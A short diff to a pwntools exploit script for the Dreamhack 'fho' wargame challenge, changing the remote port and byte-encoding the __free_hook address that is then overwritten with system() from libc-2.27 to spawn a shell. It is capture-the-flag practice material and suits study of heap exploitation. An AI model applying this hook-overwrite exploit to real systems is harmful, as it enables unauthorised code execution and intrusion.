@@ -1,5 +1,5 @@
 from pwn import *
-p=remote("host3.dreamhack.games",21418)
+p=remote("host3.dreamhack.games",12970)
 e=ELF("./fho")
 libc=ELF("./libc-2.27.so")
 def slog(name, addr): return success(': '.join([name, hex(addr)]))
@@ -18,7 +18,7 @@ binsh = libc_base + next(libc.search(b"/bin/sh"))
 
 
 p.recvuntil("To write: ")
-p.sendline(str(free_hook))
+p.sendline(str(free_hook).encode())
 p.recvuntil("With: ")
 p.sendline(str(system))
 
